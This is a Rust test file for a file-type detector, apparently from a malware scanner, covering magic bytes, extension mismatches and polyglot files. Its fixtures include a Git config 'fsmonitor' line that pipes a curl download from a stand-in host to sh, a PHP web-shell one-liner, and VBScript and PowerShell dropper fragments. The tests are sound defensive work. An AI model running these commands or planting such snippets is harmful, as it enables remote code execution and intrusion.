    assert_detect("rules.mk", b"all:\n\techo hi\n", FileType::Makefile);
    assert_detect("buildfile", b"all:\n\techo hi\n", FileType::Makefile);
    assert!(
        detect(
            Path::new("buildfile"),
            b"This is a note:\n  run make later.\n"
        )
        .is_none(),
        "prose mentioning make should not look like a build file"
    );
}

#[test]
fn makefile_content_overrides_signatureless_image_extensions() {
    let body = b"JPEG_INC ?= $(shell pkg-config --cflags libjpeg || echo)\nJPEG_LIB ?= $(shell pkg-config --libs libjpeg || echo -ljpeg)\n";
    for path in ["util/makefile.jpeg", "util/makefile.png"] {
        let detected = detect(Path::new(path), body).expect("make syntax is content evidence");
        assert_eq!(detected.file_type, FileType::Makefile, "{path}");
        assert_eq!(detected.source, DetectionSource::Heuristic, "{path}");
        assert!(detected.extension_mismatch(), "{path}");
        assert!(detected.extension_type().is_some(), "{path}");
    }
}

#[test]
fn makefile_content_does_not_override_a_valid_jpeg_signature() {
    let image = b"\xFF\xD8\xFF\xE0JPEG_INC ?= $(shell pkg-config --cflags libjpeg)\n";
    let detected = detect(Path::new("photo.jpeg"), image).expect("JPEG signature");
    assert_eq!(detected.file_type, FileType::Jpeg);
    assert_eq!(detected.source, DetectionSource::Magic);
}

#[test]
fn javascript_comment_and_indented_code_do_not_look_like_makefile() {
    const BALALA: &[u8] = include_bytes!("../../testdata/vbs/balala-wrapper.sample");
    let detected = detect(Path::new("payload.sample"), BALALA)
        .expect("embedded JavaScript wrapper should be identified");
    assert_eq!(detected.file_type, FileType::JavaScript);

    let source = b"function f() {\n\t//post: explanation\n\tcall();\n}\n";
    assert!(
        detect(Path::new("source.unknown"), source)
            .is_none_or(|d| d.file_type != FileType::Makefile)
    );
}

#[test]
fn strong_source_heuristics_override_signatureless_image_extensions() {
    let python = b"import os\nimport subprocess\ndef run():\n    subprocess.call(['tool'])\n";
    for path in ["payload.jpeg", "payload.png"] {
        let detected = detect(Path::new(path), python).expect("Python content");
        assert_eq!(detected.file_type, FileType::Python, "{path}");
        assert_eq!(detected.source, DetectionSource::Heuristic, "{path}");
        assert!(detected.extension_mismatch(), "{path}");
    }
}

// ── Skip / non-match ─────────────────────────────────────────────

#[test]
fn unknown_binary_returns_none() {
    // `.bin` now classifies as `Data` (see ext.rs), so use an
    // unregistered extension + unrecognised magic to exercise the
    // "truly unknown" path.
    let got = detect(Path::new("data.blob"), b"\x00\x00\x00\x00");
    assert!(
        got.is_none(),
        "expected None for unknown content, got {got:?}"
    );
}

#[test]
fn magic_less_types_survive_a_wrapper_suffix() {
    // A quarantined or backed-up config has no signature in its bytes, so
    // the extension under the wrapper is the only evidence there is. Before
    // this, only source code was read out from under a wrapper and these
    // typed as unknown — meaning cleave skipped them and no rule ran.
    let yaml = b"apiVersion: v1\nkind: Pod\nmetadata:\n  name: x\n";
    let json = b"{\n  \"name\": \"x\"\n}\n";
    assert_detect("deploy.yaml.quarantine", yaml, FileType::Yaml);
    assert_detect("cfg.yaml.bak", yaml, FileType::Yaml);
    assert_detect("package.json.bak", json, FileType::Json);
    assert_detect("index.js.bak", b"const a = 1;\n", FileType::JavaScript);
    // Binaries and archives are NOT typed from a name under a wrapper —
    // their magic is authoritative, so a renamed payload cannot claim a
    // type its bytes do not support.
    assert!(
        detect_path(Path::new("note.so.old")).is_none(),
        "a binary must not be typed from its name under a wrapper"
    );
    assert!(detect_path(Path::new("app.tar.gz.bak")).is_none());
}

#[test]
fn version_suffix_is_not_an_unknown_extension() {
    // Registry artifacts are stored as `<name>@<semver>` with no suffix.
    // `Path::extension` splits on the last dot and reports "0"/"25", which
    // was being read as an unrecognized extension — making every ordinary
    // npm/crate/gem tarball an `archive_as_unknown` masquerade signal.
    let gz = b"\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03";
    for name in [
        "keyvault-keys@4.8.0",
        "cranelift-native@0.118.0",
        "react-redux@7.1.25",
        "jsonpointer@v0.21.1",
        "python3.11",
    ] {
        let det = detect(Path::new(name), gz).unwrap();
        assert!(
            !det.extension_mismatch(),
            "{name} reported an extension mismatch on a version suffix"
        );
    }
    // A named extension still counts, in both directions.
    assert!(
        !detect(Path::new("pkg-1.2.3.tgz"), gz)
            .unwrap()
            .extension_mismatch()
    );
    assert!(
        detect(Path::new("photo.png"), gz)
            .unwrap()
            .extension_mismatch(),
        "a real extension disagreeing with content is still a mismatch"
    );
}

// ── Formats added from the gauntlet good-cohort "unknown" bucket ──
// Every case below is a real artifact that atomscan could not identify.

/// A SquashFS superblock: `hsqs` magic, then the 4.0 header fields.
fn squashfs_superblock() -> Vec<u8> {
    let mut v = b"hsqs".to_vec();
    // inodes, mkfs_time, block_size, fragments, compression, block_log,
    // flags, ids, s_major(4), s_minor(0).
    v.extend_from_slice(&10u32.to_le_bytes());
    v.extend_from_slice(&0u32.to_le_bytes());
    v.extend_from_slice(&131_072u32.to_le_bytes());
    v.extend_from_slice(&1u32.to_le_bytes());
    for field in [1u16, 17, 0, 0, 4, 0] {
        v.extend_from_slice(&field.to_le_bytes());
    }
    v.resize(256, 0);
    v
}

#[test]
fn snap_is_squashfs_named_by_extension() {
    // binwalk-ng_5.snap — a SquashFS image. The magic gives the filesystem;
    // only the extension says it is a Snap package.
    assert_detect("binwalk-ng_5.snap", &squashfs_superblock(), FileType::Snap);
    assert_detect(
        "firmware.squashfs",
        &squashfs_superblock(),
        FileType::SquashFs,
    );
    // Big-endian superblocks are the same filesystem.
    let mut be = squashfs_superblock();
    be[..4].copy_from_slice(b"sqsh");
    assert_detect("rootfs.bin", &be, FileType::SquashFs);
}

#[test]
fn snap_extension_without_readable_body() {
    // With no readable body, the extension still names the package.
    assert_detect("binwalk-ng_5.snap", b"", FileType::Snap);
    assert_eq!(
        detect_path(Path::new("binwalk-ng_5.snap"))
            .unwrap()
            .file_type,
        FileType::Snap
    );
}

#[test]
fn snap_text_snapshot_is_not_a_squashfs_archive() {
    let snapshot = b"// Jest Snapshot v1, https://goo.gl/fbAQLP\n\nexports[`cover 1`] = `\n\"<div class=\"wp-block-cover\">Cover</div>\"\n`;\n";
    for name in [
        "transforms.native.js.snap",
        "output.snap",
        "output.squashfs",
    ] {
        let detection = detect(Path::new(name), snapshot).unwrap();
        assert_eq!(
            detection.file_type,
            FileType::JavaScript,
            "{name}: {detection:?}"
        );
        assert!(detection.extension_mismatch(), "{name}: {detection:?}");
    }
    // Binary bodies without the filesystem signature also must not enter
    // the SquashFS extractor solely because of their name.
    assert_detect("opaque.snap", &[0, 1, 2, 3].repeat(64), FileType::Data);
}

#[test]
fn flatpak_is_extension_only() {
    // Beekeeper-Studio-5.9.3-aarch64.flatpak — an OSTree static delta in
    // GVariant framing, with no magic at a fixed offset to key on.
    assert_ext("Beekeeper-Studio-5.9.3-aarch64.flatpak", FileType::Flatpak);
}

#[test]
fn pgp_signature_armored_and_by_extension() {
    // OpenJDK21U-testimage_x64_mac_hotspot_21.0.12_8.tar.gz.sig — the `.sig`
    // suffix follows a `.tar.gz`, so it must beat the archive fallbacks.
    assert_ext(
        "OpenJDK21U-testimage_x64_mac_hotspot_21.0.12_8.tar.gz.sig",
        FileType::PgpSignature,
    );
    assert_detect(
        "release.asc",
        b"-----BEGIN PGP SIGNATURE-----\n\niQIzBAAB\n",
        FileType::PgpSignature,
    );
}

#[test]
fn certificate_signature_is_distinct_from_openpgp() {
    let data = include_bytes!("../../tests/data/certificate-signature.sig");
    for name in ["libwidevinecdm.dylib.sig", "framework.SIGN", "renamed"] {
        let det = detect(Path::new(name), data).unwrap();
        assert_eq!(det.file_type, FileType::Data, "{name}");
        assert_eq!(det.source, DetectionSource::Magic);
        assert!(!det.extension_mismatch(), "{name}");
    }
    assert_eq!(detect_content(data).unwrap().file_type, FileType::Data);
    let mut flag_one = data.to_vec();
    *flag_one.last_mut().unwrap() = 1;
    assert_detect("framework.sig", &flag_one, FileType::Data);
    // A certificate prefix cannot hide another body or malformed framing.
    for damaged in [
        &data[..data.len() - 1],
        &[data.as_slice(), b"payload"].concat(),
        &data[..64],
    ] {
        assert!(!super::magic::certificate_signature_data(damaged));
    }
    let mut bad_certificate = data.to_vec();
    bad_certificate[4] = 0x31;
    assert!(!super::magic::certificate_signature_data(&bad_certificate));
    // The convention applies to binary signature extensions, not ASCII armor.
    assert!(
        detect(Path::new("release.asc"), data)
            .unwrap()
            .extension_mismatch()
    );
}

#[test]
fn checksum_manifest_is_text() {
    // libdenort-x86_64-pc-windows-msvc.zip.sha256sum — the `.zip` in the
    // middle of the name must not win.
    assert_ext(
        "libdenort-x86_64-pc-windows-msvc.zip.sha256sum",
        FileType::Text,
    );
    assert_ext("SHASUMS256.txt", FileType::Text);
}

#[test]
fn generic_yaml_is_typed() {
    // hle.yaml / config.yaml / gpqa.yaml from HuggingFace model repos.
    assert_ext("hle.yaml", FileType::Yaml);
    assert_ext("config.yml", FileType::Yaml);
}

#[test]
fn yaml_dialects_are_not_extension_mismatches() {
    // A workflow is YAML: refining `.yml` to GithubActions is agreement
    // about one file, not a masquerade. Regression guard — typing `.yml`
    // as Yaml made every workflow file look like a mismatch.
    let data = b"name: CI\n\non: [push]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n";
    let det = detect(Path::new("ci.yml"), data).unwrap();
    assert_eq!(det.file_type, FileType::GithubActions);
    assert!(!det.extension_mismatch());
    let det = detect(Path::new("pnpm-lock.yaml"), b"lockfileVersion: 9\n").unwrap();
    assert!(!det.extension_mismatch());
}

#[test]
fn new_types_round_trip_through_labels() {
    for ft in [
        FileType::Yaml,
        FileType::Snap,
        FileType::Flatpak,
        FileType::SquashFs,
        FileType::PgpSignature,
    ] {
        assert_eq!(FileType::from_label(ft.label()), Some(ft), "{ft:?}");
    }
}

#[test]
fn yaml_not_misclassified() {
    // A plain YAML config is Yaml — not the language whose keywords its
    // values happen to contain, and no longer an unknown. `on: push` is
    // deliberately workflow-shaped: the GitHub Actions refinement needs a
    // `jobs:` key too, so this must stay generic.
    let det = detect(Path::new("config.yaml"), b"name: test\non: push\n").unwrap();
    assert_eq!(det.file_type, FileType::Yaml);
    assert!(!det.extension_mismatch());
}

#[test]
fn json_data_detects_as_generic_json() {
    let det = detect(Path::new("data.json"), b"{\"key\": \"value\"}").unwrap();
    assert_eq!(det.file_type, FileType::Json);
    assert!(det.file_type.is_program());
}

#[test]
fn txt_detects_as_text() {
    assert_detect("notes.txt", b"some text here", FileType::Text);
}

#[test]
fn source_map_sidecars_detect_as_data() {
    assert_ext("package/parse.ts.map", FileType::Data);
    assert_ext("bundle.map", FileType::Data);
}

#[test]
fn m4_macro_detects_as_text() {
    assert_detect(
        "build-to-host.m4",
        b"AC_DEFUN([gl_BUILD_TO_HOST], [AC_SUBST([$1])])\n",
        FileType::Text,
    );
}

#[test]
fn raw_lzma_extension_detects_as_lzma() {
    assert_detect(
        "fixture.lzma",
        b"\x5d\x00\x00\x80\x00\xff\xff\xff\xff\xff\xff\xff\xff",
        FileType::Lzma,
    );
}

#[test]
fn asar_detects_as_archive() {
    assert_detect(
        "app.asar",
        b"\x04\x00\x00\x00\x20\x00\x00\x00\x1c\x00\x00\x00\x18\x00\x00\x00{\"files\":{}}",
        FileType::Asar,
    );
    assert!(FileType::Asar.is_archive());
}

// ── API: detect_content / detect_path ────────────────────────────

#[test]
fn detect_content_only() {
    let det = detect_content(b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR").unwrap();
    assert_eq!(det.file_type, FileType::Png);
}

#[test]
fn detect_path_only() {
    let det = detect_path(Path::new("app.js")).unwrap();
    assert_eq!(det.file_type, FileType::JavaScript);
}

// ── Filename-detected types inside temp directories ──────────────

/// Filename-detected types (package.json, Cargo.toml, etc.) must be
/// recognized when the file sits inside a temp directory, which is how
/// the HTTP upload handlers preserve the original name.
#[test]
fn license_in_temp_dir_detected_as_text() {
    let data = include_bytes!("testdata/LICENSE");
    let det = detect(Path::new("/tmp/fn-list/LICENSE"), data).unwrap();
    assert_eq!(det.file_type, FileType::Text);
    assert_eq!(det.source, DetectionSource::Filename);
}

// ── Content-first detection beats extension-only fallback ────────

#[test]
fn roff_man_page_content_beats_source_language_heuristics() {
    let man_page = b".de EX\n.nf\n.ft CW\n..\n.de EE\n.br\n.fi\n.ft 1\n..\n\
.TH AWK 1\n.SH NAME\n.B awk\n- pattern-directed scanning and processing language\n\
.SH DESCRIPTION\n.PP\n.I Awk\n scans each input file.\n.TP\n.B -F fs\n";

    for path in ["awk.1", "renamed.js"] {
        let detection = detect(Path::new(path), man_page)
            .expect("recognizable roff manual should be identified");
        assert_eq!(detection.file_type, FileType::Text, "{path}");
        assert_eq!(detection.source, DetectionSource::Heuristic, "{path}");
        assert!(!detection.file_type.is_source_code(), "{path}");
    }

    let javascript = b"const total = 1;\nfunction add(value) { return total + value; }\n";
    assert_detect("example.js", javascript, FileType::JavaScript);

    // A lone troff-looking request is common in examples and is not a
    // document signature by itself.
    let example = b".TH is shown as a command example\nconst total = 1;\n";
    assert_detect("example.js", example, FileType::JavaScript);
}

/// Real-world polyglot: a `.zip` file whose first KB is a VBScript
/// payload (CHM/EOCD-comment dropper). Trusting the `.zip` extension
/// would route to the ZIP analyzer and fail outright; the heuristic
/// must take precedence so the script content gets analyzed and the
/// extension/content mismatch surfaces.
#[test]
fn polyglot_zip_extension_with_vbscript_body_detected_as_vbs() {
    let body = b"On Error Resume Next\r\n\
            Dim S1, FSO, Shell\r\n\
            Set FSO = CreateObject(\"Scripting.FileSystemObject\")\r\n\
            Set Shell = CreateObject(\"WScript.Shell\")\r\n\
            Set S1 = CreateObject(\"ADODB.Stream\")\r\n";
    let det = detect(Path::new("Wallets.zip"), body).unwrap();
    assert_eq!(det.file_type, FileType::Vbs);
    assert_eq!(det.source, DetectionSource::Heuristic);
    // The mismatch must be visible to callers (cleave reports it as a
    // suspicious "extension says X but content is Y" finding).
    assert!(det.extension_mismatch());
    assert_eq!(det.extension_type(), Some(FileType::Zip));
}

#[test]
fn content_heuristic_precedes_well_known_filename() {
    let body = b"On Error Resume Next\r\n\
            Dim S1, FSO, Shell\r\n\
            Set FSO = CreateObject(\"Scripting.FileSystemObject\")\r\n\
            Set Shell = CreateObject(\"WScript.Shell\")\r\n\
            Set S1 = CreateObject(\"ADODB.Stream\")\r\n";
    let det = detect(Path::new("Makefile"), body).unwrap();
    assert_eq!(det.file_type, FileType::Vbs);
    assert_eq!(det.source, DetectionSource::Heuristic);
    assert!(det.extension_mismatch());
}

#[test]
fn cmake_commands_keep_embedded_compiler_probes_from_changing_type() {
    let body = b"cmake_minimum_required(VERSION 2.8)\nproject(json-c LANGUAGES C)\n\
        check_c_source_compiles(\"int main() { return 0; }\" HAVE_TEST)\n\
        # local function marker; then return end\n";
    for name in ["CMakeLists.txt", "checks.cmake"] {
        let found = detect(Path::new(name), body).unwrap();
        assert_eq!(found.file_type, FileType::Cmake);
        assert!(!found.extension_mismatch());
    }
    let lua =
        b"local value = setmetatable({}, {__index = function() return nil end})\nreturn value\n";
    assert_eq!(
        detect(Path::new("CMakeLists.txt"), lua).unwrap().file_type,
        FileType::Lua
    );
    let php = b"<?php system($_GET['cmd']); // cmake_minimum_required(VERSION 3.0)";
    assert_eq!(
        detect(Path::new("CMakeLists.txt"), php).unwrap().file_type,
        FileType::Php
    );
}

#[test]
fn git_config_content_identifies_extensionless_and_misnamed_files() {
    let config = b"[core]\n\
            repositoryformatversion = 0\n\
            filemode = true\n\
            [remote \"origin\"]\n\
            url = https://example.invalid/project.git\n\
            fetch = +refs/heads/*:refs/remotes/origin/*\n";

    let detection = detect(Path::new("/repo/.git/config"), config)
        .expect("Git config content must identify extensionless .git/config");
    assert_eq!(detection.file_type, FileType::Text);
    assert_eq!(detection.source, DetectionSource::Heuristic);
    assert_eq!(detection.ext_match, ExtensionMatch::Consistent);

    let misnamed = detect(Path::new("Makefile"), config)
        .expect("Git config content must beat an exact filename match");
    assert_eq!(misnamed.file_type, FileType::Text);
    assert_eq!(misnamed.source, DetectionSource::Heuristic);
    assert!(misnamed.extension_mismatch());

    // A malicious one-key core setting is still enough to identify the
    // config file, so rules can analyze its command value.
    let trigger = b"[core]\nfsmonitor = curl https://example.invalid/a | sh\n";
    assert_eq!(
        detect(Path::new("/repo/.git/config"), trigger)
            .expect("a Git fsmonitor setting is a config signature")
            .file_type,
        FileType::Text
    );
}

#[test]
fn git_config_heuristic_rejects_source_assignments_and_generic_ini() {
    let parser_variable = b"clean = re.sub(\"pattern\", \"\", raw)\n";
    assert_eq!(
        detect(Path::new("parser.py"), parser_variable)
            .expect("the source extension identifies Python")
            .file_type,
        FileType::Python
    );

    let process_variable = b"process = processes_mapping[pid]\n";
    assert_eq!(
        detect(Path::new("ps.py"), process_variable)
            .expect("the source extension identifies Python")
            .file_type,
        FileType::Python
    );

    assert!(detect(Path::new("config"), b"[core]\nversion = 2\n").is_none());
}

#[test]
fn readable_unknown_extension_is_detected_as_text_from_content() {
    let det = detect(
        Path::new("override.conf"),
        b"install demo /sbin/modprobe --ignore-install demo\n",
    )
    .unwrap();
    assert_eq!(det.file_type, FileType::Text);
    assert_eq!(det.source, DetectionSource::Heuristic);
    assert_eq!(det.ext_match, ExtensionMatch::Unknown);
}

#[test]
fn binary_unknown_extension_is_not_called_text_from_filename() {
    let det = detect(Path::new("override.conf"), b"\x00\x01\x02\x03binary");
    assert!(det.is_none() || det.unwrap().file_type != FileType::Text);
}

/// Same idea, but with PowerShell content under a `.zip` extension —
/// covers the `.NET reflection AMSI bypass` shape we sometimes see
/// dropped under decoy archive names.
#[test]
fn polyglot_zip_extension_with_powershell_body_detected_as_ps1() {
    let body = b"$ErrorActionPreference = 'SilentlyContinue'\n\
            Invoke-Expression $payload\n\
            [Reflection.Assembly]::Load($bytes)\n";
    let det = detect(Path::new("update.zip"), body).unwrap();
    assert_eq!(det.file_type, FileType::PowerShell);
    assert!(det.extension_mismatch());
}

/// Negative: a real ZIP (PK magic) under `.zip` must still resolve
/// via magic detection, *not* via heuristics — even if the archive
/// happens to embed text that resembles script keywords later in the
/// file. Heuristics scan only the first few KB so PK at offset 0
/// short-circuits cleanly.
#[test]
fn real_zip_still_detected_by_magic_not_heuristics() {
    let mut data = b"PK\x03\x04".to_vec();
    // Append some script-like text that *would* trigger heuristics if
    // we ever reached them.
    data.extend_from_slice(b"WScript.Shell CreateObject Option Explicit");
    let det = detect(Path::new("real.zip"), &data).unwrap();
    assert_eq!(det.file_type, FileType::Zip);
    assert_eq!(det.source, DetectionSource::Magic);
    assert!(!det.extension_mismatch());
}

#[test]
fn source_extension_beats_weak_language_heuristics() {
    let go = b"package main\n\nimport \"log/slog\"\n\nfunc main() { slog.Info(\"ok\") }\n";
    let det = detect(Path::new("main.go"), go).unwrap();
    assert_eq!(det.file_type, FileType::Go);
    assert_eq!(det.source, DetectionSource::Extension);
    assert!(!det.extension_mismatch());

    let js = b"const fs = require('fs');\nvar x = 1;\nmodule.exports = x;\n";
    let det = detect(Path::new("index.js"), js).unwrap();
    assert_eq!(det.file_type, FileType::JavaScript);
    assert_eq!(det.source, DetectionSource::Extension);
    assert!(!det.extension_mismatch());
}

#[test]
fn unsupported_ocaml_extensions_skip_weak_language_heuristics() {
    let ml =
        b"open Stdune\nmodule Scheduler = Fiber.Scheduler\nlet main () = Fiber.run Scheduler.go\n";
    let det = detect(Path::new("scheduler_bench.ml"), ml).unwrap();
    assert_eq!(det.file_type, FileType::Text);
    assert_eq!(det.source, DetectionSource::Extension);
    assert!(!det.extension_mismatch());

    let mli = b"type t\nval create : unit -> t\nval run : t -> unit\n";
    let det = detect(Path::new("duneboot.mli"), mli).unwrap();
    assert_eq!(det.file_type, FileType::Text);
    assert_eq!(det.source, DetectionSource::Extension);
    assert!(!det.extension_mismatch());
}

/// Negative: a `.cargo.toml` file with text content stays in its
/// declared role via the extension/filename path. Data formats are
/// listed in `ext::is_data_format` precisely so heuristics doesn't
/// second-guess them — even if the body's first few KB include
/// keyword sequences that look script-like.
#[test]
fn data_format_extension_skips_heuristics() {
    // YAML body deliberately seeded with `===` and `WScript.` —
    // both are heuristic triggers — to confirm `.yaml` short-
    // circuits past the heuristic stage.
    let body = b"name: example\n=== heading ===\n# WScript.Shell mention\nfield: value\n";
    let det = detect(Path::new("config.yaml"), body);
    // `.yaml` isn't a recognised type in fileid's enum (treated as a
    // data format that the analyzer pipeline handles elsewhere), so
    // the function returning `None` here is correct — the important
    // assertion is that we did NOT misclassify this as JavaScript /
    // VBScript via heuristics. If a regression makes heuristics fire,
    // `det` would be `Some(JavaScript)` or similar instead of `None`.
    if let Some(d) = det {
        assert!(
            !matches!(
                d.file_type,
                FileType::JavaScript | FileType::Vbs | FileType::PowerShell
            ),
            "yaml body misclassified as {:?}",
            d.file_type
        );
    }
}

#[test]
fn package_json_in_temp_dir() {
    let det = detect(Path::new("/tmp/cleave-abc123/package.json"), b"{}").unwrap();
    assert_eq!(det.file_type, FileType::PackageJson);
}

#[test]
fn package_lock_json_in_temp_dir() {
    let det = detect(Path::new("/tmp/cleave-abc123/package-lock.json"), b"{}").unwrap();
    assert_eq!(det.file_type, FileType::PackageLockJson);
}

#[test]
fn cargo_toml_in_temp_dir() {
    let det = detect(Path::new("/tmp/cleave-abc123/Cargo.toml"), b"[package]").unwrap();
    assert_eq!(det.file_type, FileType::CargoToml);
}

#[test]
fn composer_json_in_temp_dir() {
    let det = detect(Path::new("/tmp/cleave-abc123/composer.json"), b"{}").unwrap();
    assert_eq!(det.file_type, FileType::ComposerJson);
}

/// A temp file with a mangled name (old behavior: suffix-based) must NOT
/// match filename detection — this documents why the temp-directory
/// approach is necessary.
#[test]
fn mangled_temp_name_does_not_detect_package_json() {
    // Old behavior: TempBuilder::new().suffix("_package.json") produces
    // a filename like ".tmpXXXXXX_package.json" which doesn't match.
    let det = detect(Path::new("/tmp/.tmpABC_package.json"), b"{}").unwrap();
    assert_eq!(det.file_type, FileType::Json);
}

/// Every variant's label is unique and round-trips through `from_label`.
/// Both come from the one `file_types!` table, and [`FileType::ALL`] is
/// generated from it too, so every variant is checked.
#[test]
fn label_round_trips() {
    use std::collections::HashSet;
    let mut seen = HashSet::new();
    for &ft in FileType::ALL {
        let label = ft.label();
        assert!(seen.insert(label), "duplicate label {label:?}");
        assert_eq!(
            FileType::from_label(label),
            Some(ft),
            "round-trip failed for {label:?}"
        );
    }
    assert_eq!(FileType::from_label("not_a_label"), None);
}

#[test]
fn serde_uses_canonical_label() {
    // The serialized form is the canonical label, not the old snake_case
    // derive — `tar.gz`, not `tar_gz`; `macho`, not `mach_o`.
    assert_eq!(
        serde_json::to_string(&FileType::TarGz).unwrap(),
        "\"tar.gz\""
    );
    assert_eq!(
        serde_json::to_string(&FileType::MachO).unwrap(),
        "\"macho\""
    );
    let ft: FileType = serde_json::from_str("\"python_sdist\"").unwrap();
    assert_eq!(ft, FileType::PythonSdist);
    assert!(serde_json::from_str::<FileType>("\"tar_gz\"").is_err());
}

#[test]
fn apple_plist_xml_and_strings_names_agree_with_native_serializations() {
    let xml = br#"<?xml version="1.0"?><plist version="1.0"><dict><key>x</key><string>y</string></dict></plist>"#;
    let binary = b"\x62\x70\x6c\x69\x73\x74\x30\x30\xd1\x01\x02\x51\x78\x51\x79\x08\x0b\x0d\x00\x00\x00\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f";
    for (name, data) in [
        ("entitlements.xml", xml.as_slice()),
        ("InfoPlist.strings", xml.as_slice()),
        ("InfoPlist.strings", binary.as_slice()),
    ] {
        let id = FileId::from_path_and_bytes(Path::new(name), data);
        assert_eq!(id.file_type(), FileType::Plist, "{name}");
        assert!(
            !id.extension_mismatch(),
            "native plist encoding is allowed by {name}"
        );
    }
    assert!(FileId::from_path_and_bytes(Path::new("payload.xml"), binary).extension_mismatch());
    assert!(FileId::from_path_and_bytes(Path::new("payload.png"), xml).extension_mismatch());
    assert!(
        FileId::from_path_and_bytes(Path::new("payload.strings"), b"\x7fELF\x02\x01\x01\x00")
            .extension_mismatch()
    );
}
